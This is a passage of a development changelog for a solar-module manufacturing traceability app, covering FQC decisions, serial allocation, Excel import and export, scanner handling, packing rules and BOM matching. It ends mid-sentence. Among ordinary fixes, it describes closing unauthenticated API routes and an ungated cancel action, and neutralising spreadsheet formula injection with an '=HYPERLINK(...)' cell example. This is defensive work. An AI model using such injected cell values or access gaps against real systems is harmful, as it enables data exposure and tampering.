### 3. The defect an FQC decision carries was invisible on five screens

Stage 3 moved defects into `fqc_defect` and stopped writing
`fqc_record.defect`. These still read only that column: the dashboard's
rejection reasons and its drill-down, Quality's row and popup on Needs Review,
Hold & Deviation, and the module journey on Search & Trace. Every rejection
since read "no defect recorded", and Quality decided GY or BGY without being
shown what FQC found - which is what "otherwise Quality decides" (above) relies
on. `db.defect_labels()` reads `fqc_defect` (falling back to the old column for
a decision from before Stage 3); a rejection with two defects counts under both;
"low eff" and "Low Eff" are one defect; a PASS shows its defects too ("passed
despite Burning"). The tests that should have caught it seeded the dead column by
hand. `test_defect_readers.py` (6) goes through the real write path and fails
6/6 against the previous code.

### Verified on real data (a copy of the live DB, the real sources, read-only)

- `ICON625R1292130846`: now on Needs Review ("SS 631.0 W at 18:40 - FQC not done
  yet"; the reading came from the tester's XML, the later of its two tests).
- Two passes over the copy: the first `{'not_in_master_unplanned': 1,
  'planned_closed': 503}`, the second `{}` - nothing new, nothing written.
- From the 10th-newest unplanned serial (the newest ones' EL images are not filed
  yet), random pass/reject through the real API and through the real screens
  (Chromium, screenshots): every one accepted, on Needs Review with its decision
  showing; then planned - pass -> graded A and packable, reject -> rejected and
  in Quality's queue, items resolved as `planned`. One of nine got the existing
  409 "the reading changed since this screen loaded": its EL image was filed
  between lookup and save.

### What actually happens, walked scenario by scenario

Mukesh asked the question the docs cannot answer: not what it is supposed to do,
what it DOES. Twelve situations around "the Sun Simulator read a module before
Planning knew about it" were run end to end through the real endpoints against a
planted tester/EL layout (`scenarios.py`, kept out of the repo). Six behaved as
designed. Six did not, and five of those are fixed here.

**His own case - scanned at the Sun Simulator, never graded, Incharge plans it,
and only then does it reach FQC.** It is an ordinary FQC from that point on: the
item closed itself at planning, the serial is `planned`, the lookup reads the
tester live, one decision, `test_seq` 1, and it counts on the dashboard. With the
CSV cut in between - the normal case, it is cut every shift - the reading the
poller saved stands in, so the module is not sent back to the tester. With
nothing saved and nothing live (the CSV was cut inside the poller's 60 s), SS is
NA: it cannot be passed, only re-tested or rejected. Same rule as any planned
module with no reading.

**Fixed: a module could be allocated as a wattage it is not.** Planning wrote the
INDENT ITEM's model and wattage onto the serial row without ever looking at the
serial's own, so a 625 W module planned on a 630 W item simply became a 630 W
module in the database - and now that FQC can grade before Planning, its pass
(judged against the barcode's 625, the only wattage there is at that point) came
with it as grade A: packable, as 630 W, on a reading that never made 630.

The rule, from Mukesh: "Icon serial number contains wattage, any measurement
must meet the nameplate for allocation." The wattage in the serial IS the
module's nameplate - printed on it, and what the customer receives - so a serial
belongs on an item of its own wattage and nothing else. The MEASUREMENT does not
decide: a 625 W module reading 631 W is still a 625 W module and is refused on a
630 W item (its first draft here had that backwards). Enforced on every
allocation, new or edited, FQC or not; all 5,360 serials in the live master
already match their item, and no fixture in the repo mismatches either.
`apply_standing_fqc` keeps a net for any other route that writes serial rows: a
pass measured below the row's wattage leaves it `planned` rather than grading
it.

**Not a defect: one standing pass locks the whole allocation.** A module graded
before Planning is `graded` the instant the row is created, so a batch
containing one can be neither edited nor withdrawn. This was raised as a trap
and Mukesh settled it the other way: "on running production, plan can't be
deleted." The module has been built and tested - production IS running on it -
so a wrong indent item is undone the way any other post-production mistake is, a
**Cancel document** on the serial or the serial range (Round 34), which is
recorded and needs a step-up, not a quiet withdrawal. A loosening written
earlier in this round was reverted to keep that rule; `db.production_moved()`
now just holds the one query both allocation endpoints were spelling out
separately.

**Fixed: withdrawing an allocation lost the module.** The serial rows are
deleted, so the module is not in the master again - but its Needs Review item
stayed resolved, and the poller can only reopen one while the tester's CSV still
holds the row. An hour later, that file is cut: no row, no item, nothing
pointing at the module. Withdrawal (and an edit that drops a serial from the
range) now reopens the item itself.

**Fixed: the saved reading kept the FIRST test for ever.** A module retested
after it was planned had its `ftr_reading` left at the earlier test, because the
poller only backfills unplanned serials - the Flash Test Report read 626 W while
FQC had judged the live 631 W. Every FQC decision now keeps the reading it
judged, whether or not the master has the serial.

**Fixed: the FQC dashboard did not count these inspections, and did not say so.**
Every number on that screen is read through the serial row, so a decision made
before Planning joined away out of all of them: a shift could inspect 40 modules
and the screen would show 37 with nothing to explain the gap. The totals now
carry `awaiting_planning` and the screen says "N more not in master yet (counted
once planned)". They are counted separately rather than mixed in - which indent
item, customer and wattage the module belongs to is genuinely not known yet -
and a customer or model filter cannot ask about them at all, so the count is not
shown then.

**Not a defect, worth knowing.** A rejection made before Planning cannot be
dispositioned until the serial is planned: Quality's queue is built from serial
rows, and the GY/BGY call is written onto one. The Needs Review row now says so
in as many words ("plan it so Quality can decide") rather than leaving the
Incharge to work out why nothing is happening. And because the day and shift of
an inspection are the decision's own (which is right), a shift total that is
already closed goes UP when the serials are planned - `awaiting_planning` is what
says how much is still to come.

**Also confirmed by the walk-through:** a module scanned again at FQC after
planning supersedes its earlier decision and a reject goes to Quality; a probe
fault (BAD) cannot be graded either way and raises two rows - "not in master"
and "FTR anomaly - failed reading"; a scanner misfire is acknowledged by a
person, never planned, and FQC refuses it.

### Traceability import - the monthly Excel into Production Entry (+ backfill)

ICON's monthly traceability report is the record of which serial RANGES were
produced, by date and shift, for which customer, with the BOM that went into
them. Mukesh asked for it to be importable from the Production Entry screen -
upload, pick a date, then a shift, then the range(s) - and used for backfill.

- **`icon_traceability_import`** parses the workbook and never touches the DB:
  header-by-keyword (tolerant of the 11-row title block), merged-cell
  forward-fill, and per-row validation through `decompose()` - quantity must
  equal the serial span, one printed batch, and the row's wattage must equal
  the serial's nameplate. A bad row is a named problem, not a silent import.
  On the real September file: 260 ranges, 118,280 modules, 29 days, and 4
  malformed serials surfaced (a non-ICON `LEVT...`, a too-short, two 11-digit).
- **`/api/prodentry/import/parse`** returns the cascade (dates -> shifts ->
  ranges), each range's customer resolved (unresolved -> ICON Stock, flagged)
  and whether its serials are already in the system.
- **`/api/prodentry/import/apply`**, two modes chosen by a toggle (Mukesh's
  call): CLAIM records a range Planning already issued, exactly as the manual
  entry does; BACKFILL builds the chain a serial needs - a per-customer
  `BACKFILL/<code>` indent, a line per (model, wattage, dcr), an allocation per
  range with the file's BOM as its final material set, the serials produced,
  and the production entry - refusing any range whose serials already exist.
  Each range applies under its own SAVEPOINT. The file has no DCR column, so
  backfill takes a per-import DCR (NDCR default). Backfill bypasses the
  backdate limit (it is explicitly historical).
- **The screen**: the old "Upload Excel" drop-zone (which only toasted the file
  name) now drives the whole cascade, with a backfill toggle and DCR selector.
- **Proved by** `test_traceability_import.py` (14) and
  `test_traceability_import_ui.py` (1, real Chromium, real file end to end).

### FQC Entry - the barcode scanner (focus, lock, status line, missed scans)

Mukesh's list from the FQC station: scans were being lost or mangled.

- **Lost to focus.** The operator clicks away; the scanner types into nothing.
  A capture-phase key listener, live only while FQC Entry is showing,
  recognises a scanner burst - keys faster than anyone types (<= 60 ms apart,
  <= 35 ms on average), ending in Enter, shaped like a serial (letters AND
  digits, no spaces; no defect name has a digit) - and looks it up wherever
  focus was. Leftover text in the field is replaced, not appended to; a
  focused button is not "clicked" by the scanner's Enter. A click on empty
  space puts the caret back in the field (never stealing one from a text box
  or a selection being made).
- **Scan while a module waits for Pass / Reject.** Nothing on screen changes;
  a toast names the serial and why it waited, and it goes on **Missed scans**.
  The same serial scanned again is "already on screen", not a miss. A scan
  that lands in the Defect / Note box hands that box its own text back.
- **Scan while the lookup is running.** The field now locks the moment Enter
  is pressed (it used to stay editable, so a second scan was APPENDED to the
  serial being looked up). One lookup at a time; the second is a miss.
- **A slow lookup looked like a hang.** After 350 ms a status line appears -
  a changing word in Claude Code's manner ("Reading the Sun Simulator...",
  "Untangling..."), the serial, the seconds, "Esc to cancel"; at 10 s "slower
  than usual". Client-side only: no request, one 1 s timer. Esc lets go at
  once and a late answer is ignored; 45 s stops it for the operator.
- **Missed scans** are kept in this browser (localStorage, per station, max
  50): click one to look it up, x to drop it, Clear all. A serial leaves the
  list once it has been looked up, however it got there.
- **Is the scanner being heard?** An indicator in the scan box: Ready to scan /
  Looking up / Finish this module / Not receiving scans (window lost focus).
- **Proved by** `test_fqc_scanner_ui.py` (18, real Chromium, typing like a
  scanner and like a person); a mutation check broke each behaviour on a copy
  of the tree and all 10 mutants were caught.

### Customer filters - every spelling, name or code

Mukesh: "some filters compare customer names case-sensitively, make case
insensitive". serial / allocation / box .customer are free text and are not
written one way: production holds stock as "ICON STOCK" (1,360 serials),
"ICON Stock" (4,530) and, since the master was title-cased, "Icon Stock"
(7,190) - and a box stores the CODE ("STOCK"). Every filter was
`customer = ?`, so it found one spelling and dropped the rest.

- **`db.customer_match(col, value)`** - the one matcher: `UPPER(TRIM(col))
  IN (...)` against the value and, when the master knows the customer, its
  name and code (the same rule Search & Trace already used). Now used by the
  FQC dashboard and its module list, FQC Recent gradings, the Production
  dashboard (module events), Packing Log, Stock & Dispatch and gate passes.
- **`db.customer_options(values)`** - dropdowns offer each customer ONCE,
  under the master's name. Gate pass parties are legal names on file, so that
  list only folds case and keeps a real spelling.
- **Browser side**: Packing Log's in-page filter compares without case, by
  name or code; the FQC dashboard's list folds spellings.
- **A bug of Round 36's own, found by the new browser test**: the FQC
  dashboard built its Customer dropdown from the shift-table rows, and those
  stopped carrying a customer when the table stopped being grouped by one -
  so the dropdown offered only "All customers" (live since 09469d2). The
  server now returns the list (`customers`, every customer inspected in the
  date/shift range, before the customer filter).
- **Proved on a snapshot of the real production DB**: the old exact filter
  found 743 / 701 / 84 FQC records for the three spellings; the new one finds
  1,528 - their sum - for any of them.
- **Not changed**: `known_customers` (the Indent form's type-ahead) - it is a
  suggestion list, not a filter.
- **Then the TABLES grouped by customer** (Mukesh's screenshot of the
  Production dashboard's Customer-wise position: "Icon Stock" 8,971 and
  "ICON Stock" 4,530 on two rows, Borosil twice). SQL cannot consult the
  master, so `db.fold_customer_rows()` merges the grouped rows after the query
  - one row per customer under the master's name, counts added (every merged
  column is a count, and one batch has one spelling, so the sum is exact).
  Used by that table and Stock & Dispatch's FG-by-customer; Production Entry's
  list now names each entry's customer under the master's name, so its
  dropdown lists each once. On the real data: five raw spellings fold to two
  rows - Icon Stock 13,080 (7,190 + 4,530 + 1,360) and Borosil 6,364
  (4,000 + 2,364). A box with no customer is stock, as everywhere else.
- `test_customer_filters.py` (10, including one in Chromium); a mutation
  check broke each piece on a copy of the tree and all 8 mutants were caught.

### Packing: "produced, not ready to pack" for a module FQC had passed

Mukesh's photos from the Pallet screen (01-10-2026): ICON625R1293030154 refused
as "is produced, not ready to pack" while Search & Trace showed FQC passed it;
another module ready to pack with FQC "-". Reproduced by packing those real
serials on a copy of the production DB in Chromium, before and after.

- **Cause 1 - the backfill skipped FQC's hand-off.** FQC passed the module at
  12:00:14, before it was in the master; the traceability backfill created it
  at 12:05 as 'produced'. Planning hands new rows FQC's standing decision
  (`apply_standing_fqc`); the backfill did not, and that function only touched
  'planned' rows anyway. 637 modules (632 passed, 5 rejected) were stuck.
  Fixed both; `db.settle_standing_fqc` runs at server start and carries them
  on (verified on a snapshot: 632 graded, 5 to Quality, nothing else touched;
  a pass below its nameplate and a cancelled decision are left alone).
- **Cause 2 - the preview's FQC column searched the newest 1,000 decisions**
  of everyone's for this serial, so an older module showed FQC "-" (and every
  scan fetched 1,000 rows). Now `db.latest_fqc` reads the module's own.
- **Separate messages, as asked.** "Not FQC'd" is a hard refusal in those
  words (Mukesh: "hard-refuses non-FQC'd modules is true don't change").
  "Not in a production entry" is a separate amber warning - the module may be
  packed, Add to box asks once (listing every warning, String Rework too), and
  the audit row records `unrecorded`. A warning, not a refusal, because the
  entry is often filed later: 875 of the first 1,549 inspected modules had
  their entry recorded after FQC, 7.6 h later on average. The preview's
  Judged cell became Production (entry date and shift, or Not recorded); the
  FQC cell carries Passed / Rejected / Not FQC'd with its time. A rejection
  that never reached the record now says "rejected at FQC", not "produced".
- **Customer on the preview** is the master's name, not the raw spelling.
- **Found, not changed - needs Mukesh's decision:** a box takes its customer
  from its first module and NOTHING compares later modules' customers - a
  Borosil module can go into an Icon Stock box once it is FQC'd.
- **Found, not changed:** the legacy server-rendered `/planning` form is broken
  on SQLite (`create_allocation` writes `allocation.indent_no`, a column that
  does not exist). The screen plans through `/api/allocation`. The hand-off
  was added there too, for if it is ever revived.
- Fixtures that faked "graded" without an FQC record (gate pass x2, the String
  Rework pack test) now insert the pass FQC would leave - real data has no
  graded module without one.
- `test_pack_readiness.py` (9, two in Chromium); the backfill case is in
  `test_traceability_import.py`.

### Indent: front glass, and custom (non-ICON) serial numbers

Mukesh: the indent item's "Glass" is really the FRONT glass (ARC / NARC); the
back glass is always NARC. And an indent can carry the customer's own serial
numbers - a checkbox, default ICON.

- Form, list header and Planning's v4 field say "Front glass"; the form notes
  "Back glass is always NARC". The server refuses anything but ARC / NARC
  (it accepted any text before).
- `indent.custom_serial` (new column, ADD COLUMN migration, default 0).
  Editing may change it only while nothing is allocated. Planning's payload
  carries it, and `build_type`, on the indent and on every item.
- `db.insert_indent` defaults it, so no caller can write an explicit NULL.
- Tests: `test_indent_properties.py` (6, one in Chromium). Also fixed
  `test_indent_export.py`, stale since the customer master was title-cased.

### Packing: make-to-order modules only with their own kind

Mukesh: "if indent is created with make to order then it can't be packed with
make to stock modules or even icon stock".

- `db.build_kind(serial)` reads a module's kind from its indent (make-to-order
  vs everything else); `db.box_build_kind(box)` reads what a pallet holds from
  its modules - nothing stored beside them. `_pack_refusal` refuses a mix in
  either direction, naming both indents; an empty pallet takes either kind.
  Repack applies it to each new pallet's whole group.
- The preview names the kind (a "make to order" tag by the customer).
- **Found in the real data, not changed:** every indent on file is
  make-to-stock, including Borosil's (IS2I/26/0002, /0003), although the
  schema notes call Borosil make-to-order. The rule changes nothing until an
  indent is make-to-order - Mukesh may want Borosil's header corrected (a
  header edit works even after allocation).
- Tests: `test_pack_build_kind.py` (5, one in Chromium); a mutation check
  caught all 9 mutants.

### Custom (non-ICON) serial numbers: the Excel upload, and "never issued twice"

Mukesh: for a custom-serial indent, Planning takes the serials from an Excel
upload (hidden otherwise) in the format Planning exports after a plan (the old
BARCODE.py layout); and a serial already in the master cannot be generated for
any customer.

- `icon_custom_serials.py` parses the workbook (no database): BARCODE header,
  pair by pair, S.NO. ignored; per-cell problems (space, length, ICON-shaped,
  duplicate). `POST /api/allocation/custom/parse` adds the master check and
  the quantity left, and refuses an ICON item.
- `POST /api/allocation` and `PUT .../update` branch on the indent's serial
  type. One pre-check, `_serial_set_refusal`, runs before anything is written:
  duplicates in the list, shape, the master (`_serials_in_master`, naming the
  holder), the nameplate. **A bug the work exposed:** the old create inserted
  the allocation, THEN decomposed the serials, so a refusal at that point
  returned 400 but still committed an empty allocation - verified on the
  committed code (1 left behind). Now none is.
- Screen: ICON item -> range fields, no upload; custom item -> upload, rail
  filled from the upload with the model taken from the ITEM (a custom serial
  says nothing about it), and the bill of materials as usual. A tag line shows
  make-to-order / custom serial numbers. Changing item drops the upload.
- Search & Trace: a custom serial has no ICON shape, so the finder now tries an
  exact serial match first (`_trace_custom_serial`).
- Tests: `test_custom_serials.py` (12), `test_custom_serials_ui.py` (5, Chromium);
  a mutation check caught all 12 mutants.
- Also fixed: `test_screen_write_gates.py` was failing since the Round 36
  traceability routes (and now this upload route) were added - its reviewed
  map now lists them (40 routes).

### Planning: copy a batch's bill of materials

Mukesh: enable "Copy from last batch", and add "copy batch from batch number"
when both indent properties are the same (build type, glass, wattage, model,
barcode etc.).

- **Why it was dead:** v4's button only toasted "Materials copied from...";
  `disableDemoClaims` disabled it as a false claim, and the later code that
  wired a real handler assigned `b.onclick` but left v4's `onclick=` ATTRIBUTE
  in place - which is what `disableDemoClaims` matches, so it was disabled
  again every time. The real handler was unreachable.
- `GET /api/allocation/copy-source` (the server decides): `last=1`, `batch=BAT-`
  or `alloc_id=` for the item chosen. "Alike" = build type, serial type, model,
  wattage, front glass, cell type (`_COPY_PROPS`). Refusals say what differs,
  one entry per property; unknown / malformed / wrongly-dated numbers, a batch
  with no bill of materials and a cancelled indent's batch are each said.
  "Last" skips batches that are not alike or have no materials.
- Screen: the button is enabled; a "Copy from batch number" box sits under
  the buttons; the copied makes fill the bill of materials, including the
  alternative a batch used within a group (e.g. the junction box). Planning's
  item line now shows make to order / custom serial numbers tags.
- Tests: `test_batch_copy.py` (8, two in Chromium); a mutation check caught
  11 of 12 (the 12th, "button left disabled", is equivalent - `disabled=false`
  is defensive).

### Cancelling an issued challan was open to any Challan writer (Fix A)

- **Wrong:** `/api/challan/<id>/discard` has an "issued" branch that cancels the
  challan - the path the Cancel button uses - with NO role check and no
  authenticator step-up, while `/cancel` (Round 34) was Admin + step-up. Two
  copies of one action; they also reverted serials differently, and `/cancel`
  swapped a blank reason for a default string.
- **Change:** `_cancel_issued_challan` is the one implementation (role, mandatory
  reason BEFORE the step-up so a blank reason does not burn the one-time code,
  step-up, issued-only, no gate pass, serials via `db.set_serial`, audit).
  `/cancel` is a thin caller (the Admin Cancel-document screen uses it);
  `/discard` calls it for an issued challan and is otherwise the draft discard,
  unchanged. The Cancel button is rendered for Admin / Super Admin (`USER.role`)
  and now asks for the authenticator code. Edit and draft discard are untouched.
- **Tests:** `test_challan.py` +6 (operator 403 on both routes, reason mandatory
  and the code not burned, gate pass on both, full cancel via /discard with
  selectors and audit, operator keeps Edit and draft discard, number not
  reused); `test_challan_cancel_ui.py` (2, Chromium). A mutation check caught 8/8.

### Three /api routes answered anonymous callers (Fix B)

- **Wrong:** with no session, `GET /api/customers` returned every customer's
  name, GSTIN, state and ERP code; `/api/customers/resolve` let anyone test
  whether a GSTIN is a customer; `/api/sync/status` gave the build id and a
  replay count. None had a gate or a note saying it was public on purpose.
  Nothing in the pages or scripts calls any of them (customers reach the page
  through the boot payload), and `enrol.html` does not.
- **Change:** all three on `require_role(*_R_EVERY)` (every signed-in role - many
  screens need customer lookup, so not a per-screen gate).
- **So it cannot recur:** `test_anonymous_routes.py` walks `url_map`, calls every
  /api rule anonymously by every method it allows (path params 1) and requires
  401, except `ALLOW` = `/api/session`, each entry with its reason. It found
  exactly these three; a mutation check proves a brand-new ungated route, a
  removed gate, and a role locked out are each caught. 112 route/method pairs.

### Stale text that sent people to the wrong place (Fix C)

- **CLI note.** `icon_auth_cli.py` said app.py "does not have that route yet
  (Round 24)" and sent you to `auth_lab/lab_app.py`; Round 25 made the real app
  serve `/enrol`. It now says to start `serve.py` on the SAME database file
  (command printed with the real path, and the port when one is set), and its
  default Enrol URL is the app's own port 8080 (it printed the lab's 8091).
  **Proved** on a fresh DB, following only what was printed: init-key,
  create-superadmin, `serve.py`, the printed Enrol URL, the on-screen secret,
  Confirm (recovery codes shown), sign-in with ID + code, then an operator made
  from the Users screen who is told to choose their own password.
  `conftest.py` now pins ICON_PORT=8091 for the lab tests - they opened the
  printed URL, which would now point at whatever is on 8080.
- **README.** New "First run" section (output from that run); "Database modes"
  replaced by "Database" - one SQLite file, what to back up (db + -wal/-shm,
  `.icon_totp_key`, `.icon_secret`, `storage/`) and a tested online-backup
  one-liner; MySQL requirements removed.
- **serve.py** printed "DEMO mode ... nothing is saved" on EVERY start:
  `db.MODE` is a constant "sqlite", so that branch always ran and the MySQL
  branch below it could never. It now logs the database file, its size and what
  to back up; the docstring lists the settings that exist.
- **Found, not changed (outside this brief):** `README_DEPLOY.md` (demo mode,
  amber DEMO pill, "Switch to MySQL") and `PROJECT_OVERVIEW.md` (lines on
  auth_lab serving /enrol) make the same stale claims; `db.py` keeps a dead MySQL
  pool (`_get_pool`, `CFG`); `app.py` sets an unused `db_mode` template variable
  that reads "MySQL".

### Junk still tracked in git (Fix D)

`check_db.py` (a one-off database peek script), `recent_html.txt`, and
`manifest.csv` / `rename_log.txt` (an unrelated image-renaming tool's output)
were tracked. `git rm --cached` on all four and added to `.gitignore`; the local
copies stay on disk. Nothing imports them - `app.py` only names `check_db.py`
in the set of files it leaves out of the restart hash, which is the same
whether or not the file is tracked. `git ls-files` no longer lists them.

### Traceability import: the BOM matched to the material master

Mukesh compared a backfilled BOM (ICON625R1293030001) with one made in Planning
(BAT-2609-00011): the make read "LIONSOLAR 25.6% (210*182.2) G12R CELL" - make,
efficiency and size in one string, written as it stood, where the master says
"Lion Solar" - and most materials were "not recorded".

- **Cause:** the importer read 4 of the file's ~15 materials and wrote the cell
  text raw. Nothing compared it with the master.
- **Change:** `icon_bom_match` (pure) resolves makes against the master's own
  makes (compact match, a known alias - GNEX -> GenX, a typo, then word-by-word;
  never a guess between two), extracts efficiency (single and ranges), cleans
  batches (one separator, de-duplicated; a "/" inside a number is kept) and
  compares sizes. The parser now finds every material column by header with its
  batch from the column BESIDE it (so the two "Ribbon Invoice/Batch no" are told
  apart); `bom_materials(bom, catalog)` maps them to the live master by name and
  family, picks alternatives by size, and defaults single-make materials.
  On the real September file all 275 ranges resolve with no unknown make and no
  missing material; the 15 mm tape, Jiangyin Yuanshuo (YS), GenX, H.B. Fuller etc.
  come out in the master's words.
- **Your answers:** 15 mm is the Lead Bending Tape's (new material 31, a group with
  the 20 mm one, so Planning offers both); multiple makes/batches joined with ",";
  efficiencies the list lacks are added (23.3% and 25.8% in this file); backfill
  batches may be refreshed.
- **Notes the file raises:** one frame stated as 2278x1134x30 (the master has
  2382x1134x30) and the string ribbon's edge size 4.0x0.41 / 0.42 vs 0.40 (51
  ranges) - recorded, size not changed, listed on screen before recording.
- Screens: the import shows the notes and the efficiencies it will add BEFORE
  recording; ranges already imported can be ticked (not by default) to refresh a
  backfill batch's BOM; Planning pre-selects single-make materials and shows a
  recorded value that is not an option (two makes joined) instead of blanking it.
- **Existing production BOMs** (raw text, only 4 materials) are repaired by
  re-uploading the same file in backfill mode and ticking the ranges.
- Tests: `test_bom_match.py` (14), `test_bom_match_ui.py` (3, Chromium); a
  mutation check caught 15 of 15.

### Shift incharge: a master, several people, one separator

Mukesh: the incharge names in the UI are v4's demo list, and there is no way to
pick several - make a master from all the individual incharges, let the form
select several, and join them with ",".

- **Wrong:** Production Entry offered v4's five demo names (RAJESH KUMAR, SURESH
  PATEL, AMIT SHARMA, VIKRAM SINGH, DEEPAK YADAV) - 57 real entries on production
  carry "RAJESH KUMAR", the first option - and exactly one name; the import took a
  single typed value for the whole file though the file has a "Shift Incharge"
  column of up to three people ("UMENDRA & YUKESH & RAJKUMAR": 24 combinations, 8
  individuals - Yaman, Rajkumar, Kamta, Deepak, Akshay, Umendra, Devendra, Yukesh).
- **Change:** table `incharge` (name + a key that makes "Raj Kumar" and "RAJKUMAR"
  one person); `db.incharge_resolve` is the one resolver; `/api/incharges` (list
  / add / Admin deactivate). The manual entry and the import both resolve every
  name against the master and refuse an unknown one; stored joined with ",".
  The picker (several ticks, add in place, an Admin's x) replaces the demo select
  - which stays in the DOM, hidden, as the carrier the submit code already reads.
  The import prefills the picker from the file when a shift's ranges agree, lists
  names the master lacks with one click to add them, and otherwise records each
  range under its own people.
- **Decision for Mukesh:** who may add / remove. I made adding open to anyone who
  can record production (a new person must not stall a shift) and removing
  Admin-only. Tell me if adding should be restricted too.
- **After deploying:** add the real incharges first - the import's "Add them to the
  master" does the file's eight in one click.
- Tests: `test_incharge_master.py` (9, two in Chromium); a mutation check caught
  10 of 10. Older tests that drove the demo dropdown now use the picker; the
  stored-XSS test asserts a markup name is refused.

### BOM follow-up: variants in the master, and an impossible size is the file's fault

Mukesh: the 2278x1134x30 frame is the G2X (M10R) frame - physically impossible on
a G12R module, so the Excel is wrong, not the master; 4.0x0.41 / 0.42 are real
thicknesses - make them variants of the material the user selects.

- The Edge string ribbon is now three materials in one group (SICE): 4.0x0.40 (14,
  existing), 0.41 (32), 0.42 (33), added to existing databases by
  `ensure_material_additions` (look first - it runs on every boot). The importer
  picks the variant by the size the file states; Planning shows the choice like
  the junction box and the lead bending tape.
- A size that exactly matches the same material of ANOTHER series is reported as
  `file_error` ("the file's size is the G2X module's ... the FILE is wrong, not the
  master"), shown in red before recording; the G12R material is what is recorded.
  On the real file that is the single 2278-wide frame; the 51 ribbon "differences"
  are gone - they were real variants.

### BOM: "not recorded" lines on ICON625R1293022642, and a default make

Mukesh's screenshot showed Edge string ribbon, Lead Bending Tape, Barcode Label and
Pallet Packing as "not recorded". Ran the importer over the real September file for
all 30 dates (275 ranges): every range has all 15 material columns with a make and
a batch; every make resolves to the master; the only note is the one 2278 frame.
- Edge ribbon and Lead Bending Tape: the file does state them (Dhash 4.0x0.42,
  H.B. Fuller 15 mm). The screenshot is a batch written by the importer BEFORE the
  variants/15 mm tape existed; the current importer records both. Repair = upload
  the same file in backfill mode and tick the range (refreshes importer-made
  batches only).
- Barcode Label and Pallet Packing are in NO column of the file. New master field
  `material.default_make`: Barcode Label -> Kvell, Pallet Packing makes ->
  Manmohan, Balaji (default Manmohan). `db.ensure_material_defaults` (look first,
  only untouched seeded rows); Planning pre-selects it; the import records it.
- Proof: the real range of ICON625R1293022642 imported through the app gives 21
  BOM lines, none without a make (`test_bom_match.py`, 15 tests;
  `test_material_defaults.py`, 4).

### Trace screen said "not recorded" for a variant that WAS recorded

ICON625R1293022642 (imported with the current code - Barcode Label showed Kvell,
Pallet Manmohan) still showed String Inter Connector - Edge "4.0 x 0.40" and Lead
Bending Tape "20 mm" as "not recorded". Cause: `iconMaterialDetail` (Search &
Trace > View full details) showed, for a group of alternatives, v4's
`chosenInGroup` default (first member) and looked up ITS recorded row; the
recorded rows were the 15 mm tape (31) and the 0.42 ribbon (33). The import and the
stored data were right (my earlier test read allocation_material, not the screen).
Fix: of a group, show the member(s) that have a recorded row; the default only when
none does. Tests: `test_bom_match_ui.py` (+2: synthetic and the real file's serial,
through search and the details modal); both fail on the old logic.

### Traceability report as Excel, and the frame's mounting holes (Round 38)

Mukesh: export the production data in the traceability report's format - month,
date-to-date range, one date for one day - with ONE material per column (the report
folds both potting parts, the two ribbons, the cell make and its efficiency into
single columns), and the frame's mounting holes (790 / 1000, 1400, 1094) as
variants of the frame.
- `icon_trace_export.py` (pure builder) + `/export/traceability.xlsx` (gated on
  Production Entry's view flag; `?month=` / `?from=&to=`, from alone = one day;
  two grouped scans of `serial` - it has no index on `prod_entry_id`, the first
  version took 16 s for a month, now 1 s). A Month box and a download button sit on
  the Production Entry filter bar and use its FROM / TO.
- Frame variants: material 34 added, 8 and 34 in group FRM, the holes after the "·"
  in the size (the matcher reads only what precedes it); the import picks by the
  file's sizes column; existing databases get it once, look first.
- Proof on the real September file (275 runs, 124,273 modules) through the app: the
  export has the same runs in the same order, every make and batch matches the file
  in every column, incharges and totals agree.
- **Found, not changed**: "AGNI GREEN" is not an alias of Agni Green Power Limited
  (Mz), so the importer files that run against Icon Stock and the report prints it
  as NORMAL. Needs Mukesh: add the alias (the Customers resolve screen can too).
- `test_trace_export.py` (7), `test_material_defaults.py` (+1), `test_bom_match.py`
  (+1), `test_bom_match_ui.py` (+frame dropdown).

### AGNI GREEN is an alias of Agni Green Power Limited (Mz)

Mukesh's call (2026-10-03). The traceability import filed that run against Icon Stock
(unresolved customer) and the Excel report printed it as NORMAL. `icon_customers.py`
C0001 gains the alias "AGNI GREEN". Existing rows already filed as Icon Stock are NOT
rewritten - re-import in backfill mode only adds missing serials; correct them by hand
if they matter. `test_trace_export.py` (+1), `test_traceability_import.py`.

### Needs Review: scan items can be discarded; a failed reading is an anomaly planned or not

Mukesh: (1) a probe/zig/test error used to go to the anomaly list and now "goes to not
in master - after planning do they go to the anomaly section?"; (2) junk scans like
ICON625R1293022642- and "ICON625R1293022642 cannot be resolved by planning and cannot
be discarded.
- Measured on a scratch tester CSV: a bad reading was ALWAYS in the anomaly list (the
  Tester Anomalies panel reads the tester file; Scan events keeps an `ftr_failed`
  item) - planned or not. An unplanned one is additionally Not in master; planning
  closes only that. What was missing was any sign of that on the Not in master row.
  Its detail said "no SS reading saved yet" (only valid readings are saved); it now
  says "SS reading FAILED (probe / jig / polarity) - also under Scan events".
- Every junk scan appeared TWICE (`not_in_master_malformed` and `ftr_junk`) with only
  "Resolve" (acknowledge). Now: Discard (reason mandatory) on those and on unplanned
  rows; closing one closes its twin; "Discard these N" for the whole list
  (`/api/review/discard-many`, one reason, each checked as a single discard); a
  discard sticks for the scan looked at (`db.upsert_unplanned_item` no longer reopens
  a discarded item for the same row still in the tester's file) and a later scan
  brings it back. A failed reading / skipped tester / lookup stay acknowledge-only.
- On the real production DB (read-only): 26 open malformed + their 26 twin junk items,
  784 open unplanned, 142 open failed readings. Several junk IDs are a REAL serial with
  an INVISIBLE scanner character in front (0x16, Ctrl-V: "ICON625R12A0212460" looks
  perfect on screen and is "malformed"); others end in a stray "-". Needs Review and
  the Tester Anomalies list now show such characters (red "<0x16>") so the reason is
  visible.
- `test_review_discard.py` (8); mutation check caught 6 of 6.

### Excel exports: text that starts like a formula is written as text

Found in my own new export, then in an older one. openpyxl turns a string that begins
with "=" into a FORMULA, so a batch / make / customer text read from an imported file
("=HYPERLINK(...)") would have been evaluated when somebody opened the report, and a
custom serial may begin with "=" (the validator accepts any printable token) in
Planning's barcodes.xlsx. Both now write such cells as text (`data_type = "s"`); the
report's own formulas are untouched. The CSV exports already neutralised theirs
(`_csv_cell`). `test_trace_export.py` (+2).

### Full-suite sweep (2026-10-03, overnight)

All 81 test files run on a clean copy of the tree. Real failures: ONE - `test_icon_ingest`
"a lookup with no decision" backdated the lookup to a fixed date (2026-09-29) that
fell outside the code's 3-day look-back window as time passed: a test that expires,
not a code fault; now relative (two hours ago). Everything else is environment: the
pytest-style files (`test_icon_auth`, `test_security_4a/4c/4e`, `test_repo_hygiene`:
27 tests) run nothing as plain scripts - run them with `python -m pytest` (all pass);
the `*_ui.py` smoke scripts and `test_auth_lab_*` need a running server;
`test_build_banner_live` needs port 8090, which is the user's own `serve.py`;
